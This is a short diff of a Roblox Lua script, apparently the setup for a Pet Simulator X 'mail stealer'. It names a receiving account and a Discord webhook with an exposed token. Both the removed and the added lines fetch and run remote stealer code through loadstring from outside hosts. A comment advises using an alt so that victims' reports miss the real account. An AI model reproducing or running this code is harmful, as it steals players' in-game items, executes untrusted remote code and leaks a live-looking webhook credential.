@@ -1,3 +1,3 @@
-getgenv().name = "Wizard_CatWhite" -- keep the username incase they report you instead they report my alt
+UserName = "Wizard_CatWhite" 
 
-loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
+WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS" loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua",true))() 
